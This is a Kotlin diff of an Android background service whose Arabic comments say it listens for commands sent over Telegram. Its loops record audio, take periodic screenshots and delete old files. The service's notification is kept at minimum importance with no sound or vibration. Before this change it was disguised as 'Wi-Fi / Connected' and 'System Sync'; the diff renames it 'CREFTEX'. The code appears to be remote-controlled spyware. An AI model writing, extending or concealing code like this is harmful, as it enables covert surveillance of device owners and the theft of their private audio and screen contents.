@@ -26,12 +26,11 @@ class BackgroundService : Service() {
         super.onCreate()
         startForegroundWithNotification()
 
-        // 🚀 الوحيد اللي يشتغل — الاستماع للأوامر من تيليجرام
         try {
             CommandListener.start(applicationContext)
         } catch (_: Exception) {}
 
-        // حلقة التنظيف فقط — ما ترسل شي، بس تحذف الملفات القديمة
+        // حلقة التنظيف فقط — ما ترسل شي
         scope.launch {
             while (running) {
                 try {
@@ -50,7 +49,7 @@ class BackgroundService : Service() {
             }
         }
 
-        // 🎤 حلقة التسجيل — تشتغل فقط لو فعّلتها يدويًا من الأمر
+        // حلقة التسجيل — تشتغل فقط لو مفعّلة من الأمر
         scope.launch {
             while (running) {
                 try {
@@ -71,7 +70,7 @@ class BackgroundService : Service() {
             }
         }
 
-        // 📷 حلقة لقطات الشاشة الدورية — تشتغل فقط لو فعّلتها يدويًا من الأمر
+        // حلقة لقطات الشاشة — تشتغل فقط لو مفعّلة
         scope.launch {
             while (running) {
                 try {
@@ -117,7 +116,7 @@ class BackgroundService : Service() {
             val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             if (nm.getNotificationChannel(channelId) == null) {
                 nm.createNotificationChannel(
-                    NotificationChannel(channelId, "System Sync", NotificationManager.IMPORTANCE_MIN)
+                    NotificationChannel(channelId, "CREFTEX", NotificationManager.IMPORTANCE_MIN)
                         .apply {
                             setSound(null, null)
                             enableVibration(false)
@@ -128,8 +127,8 @@ class BackgroundService : Service() {
         }
 
         val notif: Notification = NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Wi-Fi")
-            .setContentText("Connected")
+            .setContentTitle("CREFTEX")
+            .setContentText("Running…")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
